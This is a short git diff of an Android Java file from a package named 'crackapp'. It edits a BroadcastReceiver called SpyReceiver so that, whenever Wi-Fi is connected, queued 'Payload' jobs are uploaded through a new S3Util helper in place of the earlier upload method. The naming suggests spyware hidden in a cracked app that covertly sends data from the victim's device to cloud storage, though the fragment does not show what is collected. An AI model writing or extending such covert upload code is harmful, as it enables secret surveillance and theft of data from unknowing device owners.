@@ -19,6 +19,7 @@ import java.util.Queue;
 
 import co.poweramp.crackapp.Constants;
 import co.poweramp.crackapp.R;
+import co.poweramp.crackapp.S3Util;
 import co.poweramp.crackapp.Util;
 import cz.msebera.android.httpclient.Header;
 import cz.msebera.android.httpclient.entity.StringEntity;
@@ -49,7 +50,7 @@ public class SpyReceiver extends BroadcastReceiver {
                 NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                 if (mWifi.isConnected()) {
                     //Wi-Fi available, start upload
-                    j.upload(new Job.UploadCompletionListener() {
+                    S3Util.uploadJob(context, j, new S3Util.UploadCompletionListener() {
                         @Override
                         public void onSuccess(final Payload p) {
                             handler.post(new Runnable() {
